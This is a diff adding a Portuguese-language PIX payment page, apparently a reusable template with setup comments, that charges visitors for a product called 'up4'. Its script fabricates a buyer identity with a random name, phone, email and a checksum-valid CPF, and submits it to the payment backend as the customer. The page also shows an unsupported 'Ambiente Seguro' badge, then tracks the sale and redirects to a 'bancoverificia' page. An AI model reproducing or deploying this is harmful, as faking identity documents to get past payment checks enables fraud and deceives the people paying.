@@ -1,0 +1,299 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pagamento via PIX</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --cor-principal: #1DB954;
+    }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #f4f6f8;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 500px;
+      margin: 2rem auto;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .section-title {
+      color: var(--cor-principal);
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .qrcode-container img {
+      margin: 0 auto 1rem auto;
+      max-width: 220px;
+    }
+    .input-group {
+      display: flex;
+      align-items: center;
+      margin: 0.5rem 0 2rem 0;
+    }
+    .input-group input {
+      flex-grow: 1;
+      padding: 0.5rem;
+      font-size: 0.95rem;
+      border: 1px solid #ccc;
+      border-radius: 5px 0 0 5px;
+    }
+    .copy-btn {
+      background-color: var(--cor-principal);
+      border: none;
+      color: white;
+      padding: 0.5rem 1rem;
+      border-radius: 0 5px 5px 0;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .copy-btn.copied {
+      background-color: #2ecc71;
+    }
+    .payment-info {
+      border: 2px solid var(--cor-principal);
+      border-radius: 8px;
+      padding: 1rem;
+      text-align: left;
+      background: #fafafa;
+    }
+    .info-item {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 0.5rem;
+      font-size: 0.95rem;
+    }
+    .info-label {
+      font-weight: bold;
+    }
+    #loading {
+      color: #555;
+    }
+    .seguro-badge {
+      display: inline-block;
+      background-color: #28a745;
+      color: white;
+      font-weight: bold;
+      padding: 6px 12px;
+      border-radius: 5px;
+      font-size: 14px;
+      margin-bottom: 1rem;
+    }
+    .lock-icon {
+      margin-right: 6px;
+    }
+    #banner {
+      max-width: 100%;
+      border-radius: 8px;
+      margin-bottom: 1rem;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="seguro-badge">
+    <span class="lock-icon">🔒</span> Ambiente Seguro
+  </div>
+
+  <img src="images/bannergerador.png" id="banner" style="display: none;" alt="Banner">
+
+  <div id="loading">Gerando QR Code...</div>
+  <div id="payment-content" style="display: none;">
+    <div class="section-title">📱 Escaneie o QRCode abaixo</div>
+    <div class="qrcode-container">
+      <img id="qrcode-img" alt="QR Code PIX">
+    </div>
+
+    <div class="section-title">📋 Ou copie o código PIX</div>
+    <div class="input-group">
+      <input type="text" id="pix-code" readonly>
+      <button class="copy-btn" id="copy-btn">Copiar</button>
+    </div>
+
+    <div class="payment-info">
+      <div class="info-item">
+        <span class="info-label">🔥 Valor:</span>
+        <span id="amount">R$ 0,00</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">🕒 Válido até:</span>
+        <span id="expiration">--/--/---- --:--</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const VALOR_CENTAVOS = 3488;
+const NOME_PRODUTO = "up4";
+const ID_PRODUTO = "prod-005";
+const PLAN_ID = "plano05";
+const PLAN_NAME = "Plano Mensal";
+const USE_BANNER = true;
+// oie ai em cima tu vai configurar sua pagina de geracao de pix tmj
+
+
+window.__pixJaGerado__ = window.__pixJaGerado__ || false;
+
+function gerarCPF() {
+  let cpf = '';
+  for (let i = 0; i < 9; i++) cpf += Math.floor(Math.random() * 10);
+  let soma = 0;
+  for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
+  let resto = 11 - (soma % 11);
+  cpf += (resto > 9 ? 0 : resto);
+  soma = 0;
+  for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
+  resto = 11 - (soma % 11);
+  cpf += (resto > 9 ? 0 : resto);
+  return cpf;
+}
+function gerarNomeCompleto() {
+  const nomes = ['Lucas', 'João', 'Mariana', 'Bruna', 'Carlos', 'Ana'];
+  const sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza'];
+  return nomes[Math.floor(Math.random()*nomes.length)] + ' ' +
+         sobrenomes[Math.floor(Math.random()*sobrenomes.length)] + ' ' +
+         sobrenomes[Math.floor(Math.random()*sobrenomes.length)];
+}
+function gerarTelefone() {
+  const ddd = ['11','21','31','41','51','61','71'];
+  const numero = Math.floor(100000000 + Math.random()*900000000).toString().substring(1);
+  return `${ddd[Math.floor(Math.random()*ddd.length)]}9${numero}`;
+}
+function gerarEmail(nome) {
+  const provedores = ['gmail.com','hotmail.com','icloud.com'];
+  return nome.toLowerCase().replace(/\s+/g, '.') + '@' + provedores[Math.floor(Math.random()*provedores.length)];
+}
+function getUtmParams() {
+  const params = new URLSearchParams(window.location.search);
+  const utms = {};
+  ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','click_id'].forEach(k => {
+    if (params.has(k)) utms[k] = params.get(k);
+  });
+  return utms;
+}
+function iniciarVerificacaoPagamento(id, vendaInfo) {
+  setInterval(() => {
+    fetch('/pix/verificar_pagamento.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ id })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.status === 'APPROVED') {
+        enviarVendaUtmify({
+          ...vendaInfo,
+          status: "APPROVED",
+          approvedAt: new Date().toISOString()
+        });
+        window.top.location.href = "./bancoverificia/index.html";
+      }
+    })
+    .catch(err => console.log('erro na verificação', err));
+  }, 5000);
+}
+
+window.onload = function () {
+  if (window.__pixJaGerado__) return;
+  window.__pixJaGerado__ = true;
+
+  if (USE_BANNER) {
+    document.getElementById("banner").style.display = "block";
+  }
+
+  const nome = gerarNomeCompleto();
+  const cpf = gerarCPF();
+  const telefone = gerarTelefone();
+  const email = gerarEmail(nome);
+  const utms = getUtmParams();
+  const createdAt = new Date().toISOString();
+
+  fetch('/pix/gerar_pix.php', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      name: nome,
+      email,
+      cpf,
+      phone: telefone,
+      amount: VALOR_CENTAVOS,
+      item_title: NOME_PRODUTO,
+      utmQuery: new URLSearchParams(utms).toString(),
+      referrerUrl: location.href
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (!data.success) throw new Error(data.error || "Erro ao gerar PIX");
+
+    document.getElementById("loading").style.display = "none";
+    document.getElementById("payment-content").style.display = "block";
+    document.getElementById("qrcode-img").src = data.pix_data.qrCode || 'https://quickchart.io/qr?text=' + encodeURIComponent(data.pix_data.qrCodeText);
+    document.getElementById("pix-code").value = data.pix_data.qrCodeText;
+    document.getElementById("amount").textContent = (data.amount / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
+
+    const expiration = new Date(Date.now() + 15 * 60 * 1000);
+    document.getElementById("expiration").textContent = expiration.toLocaleString("pt-BR", {
+      day: '2-digit', month: '2-digit', year: 'numeric',
+      hour: '2-digit', minute: '2-digit'
+    });
+
+    document.getElementById("copy-btn").addEventListener("click", function () {
+      const input = document.getElementById("pix-code");
+      input.select(); input.setSelectionRange(0, 99999);
+      document.execCommand("copy");
+      this.textContent = "Copiado!";
+      this.classList.add("copied");
+      setTimeout(() => {
+        this.textContent = "Copiar";
+        this.classList.remove("copied");
+      }, 2000);
+    });
+
+    const vendaInfo = {
+      transactionId: data.transaction_id || data.id,
+      createdAt,
+      customer: { name: nome, email, cpf, phone: telefone },
+      product: {
+        id: ID_PRODUTO,
+        name: NOME_PRODUTO,
+        planId: PLAN_ID,
+        planName: PLAN_NAME,
+        quantity: 1,
+        price: VALOR_CENTAVOS
+      },
+      utm: utms,
+      commission: {
+        affiliateId: utms.click_id || null,
+        totalPriceInCents: VALOR_CENTAVOS,
+        gatewayFeeInCents: 0,
+        userCommissionInCents: VALOR_CENTAVOS
+      }
+    };
+
+    enviarVendaUtmify({ ...vendaInfo, status: "PENDING", approvedAt: null });
+    iniciarVerificacaoPagamento(vendaInfo.transactionId, vendaInfo);
+  })
+  .catch(err => {
+    document.getElementById("loading").textContent = "Erro ao gerar QR Code.";
+    console.error(err);
+  });
+};
+</script>
+<script src="/js/utmify-integration.js"></script>
+</body>
+</html>
